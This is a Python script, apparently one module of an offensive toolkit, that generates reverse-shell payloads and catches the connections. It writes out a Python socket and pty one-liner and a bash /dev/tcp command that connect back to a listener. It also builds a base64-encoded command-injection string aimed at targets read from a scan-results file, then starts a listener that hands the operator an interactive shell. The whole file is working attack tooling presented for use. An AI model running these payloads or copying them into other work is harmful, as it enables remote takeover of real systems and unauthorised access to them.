import os
import json
import socket
import base64
import time

def load_scan_state(filepath="scan_results.json"):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, "r") as f:
            return json.load(f)
    except Exception:
        return []

def handle_client(client_socket, address):
    print(f"\n[+] CONNECTION ESTABLISHED from {address[0]}:{address[1]}!")
    print("[+] Interactive shell active. Type commands below (e.g., 'whoami', 'ls -la', 'exit').\n")
    
    while True:
        try:
            command = input("shell> ").strip()
            if not command:
                continue
            if command.lower() == "exit":
                client_socket.send(b"exit\n")
                break
                
            client_socket.send((command + "\n").encode())
            
            client_socket.settimeout(2.0)
            response = b""
            try:
                while True:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < 4096:
                        break
            except socket.timeout:
                pass
                
            print(response.decode('utf-8', errors='ignore'))
        except Exception as e:
            print(f"[!] Session error: {e}")
            break
            
    client_socket.close()
    print("[-] Shell session closed.")

def start_listener(port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(("0.0.0.0", port))
        server.listen(1)
        print(f"\n[+] Listener active on port {port}. Waiting for incoming connection...")
        print("[*] Leave this listener running while you execute the payload in your target session.\n")
        
        client, addr = server.accept()
        handle_client(client, addr)
    except Exception as e:
        print(f"[!] Listener failed to bind on port {port}: {e}")
    finally:
        server.close()

def run_reverse_shell_module():
    os.system("clear" if os.name == "posix" else "cls")
    print("=================================================================")
    print(" INTELLIGENCE-DRIVEN REVERSE SHELL GENERATOR")
    print("=================================================================")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = "127.0.0.1"
        
    ip = input(f"Enter listener IP [Default: {local_ip}]: ").strip() or local_ip
    port_input = input("Enter listener port [Default: 4444]: ").strip()
    port = int(port_input) if port_input.isdigit() else 4444
    
    targets = load_scan_state()
    selected_target = None
    
    if targets:
        print("\n-----------------------------------------------------------------")
        print(" [+] Available Scanned Targets from Framework State:")
        print("-----------------------------------------------------------------")
        for idx, t in enumerate(targets, 1):
            print(f" {idx}. [{t.get('vulnerability', 'Endpoint')}] {t.get('target')}")
        print(" 0. Skip / Generic Payload Only")
        print("-----------------------------------------------------------------")
        
        choice = input(f"Select target to bind payloads against [0-{len(targets)}]: ").strip()
        if choice.isdigit() and 0 < int(choice) <= len(targets):
            selected_target = targets[int(choice) - 1]

    py_raw = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
    bash_raw = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    
    print("\n=================================================================")
    print(" GENERATED PAYLOAD SUITE")
    print("=================================================================")
    print(f" [+] Raw Python3:\n     {py_raw}\n")
    print(f" [+] Raw Bash:\n     {bash_raw}\n")
    
    if selected_target:
        target_url = selected_target.get('target')
        print("-----------------------------------------------------------------")
        print(f" [TARGET TAILORED]: {target_url}")
        print("-----------------------------------------------------------------")
        
        b64_py = base64.b64encode(py_raw.encode()).decode()
        tailored_payload = f"127.0.0.1; echo {b64_py} | base64 -d | sh"
        
        print(f" [+] Ready-to-paste Base64 Path Payload (Copy & Run in Control Center):")
        print(f"     {tailored_payload}\n")
    
    print("=================================================================")
    listen_choice = input("Start background socket listener now? [Y/n]: ").strip().lower()
    if listen_choice != 'n':
        start_listener(port)

if __name__ == "__main__":
    run_reverse_shell_module()
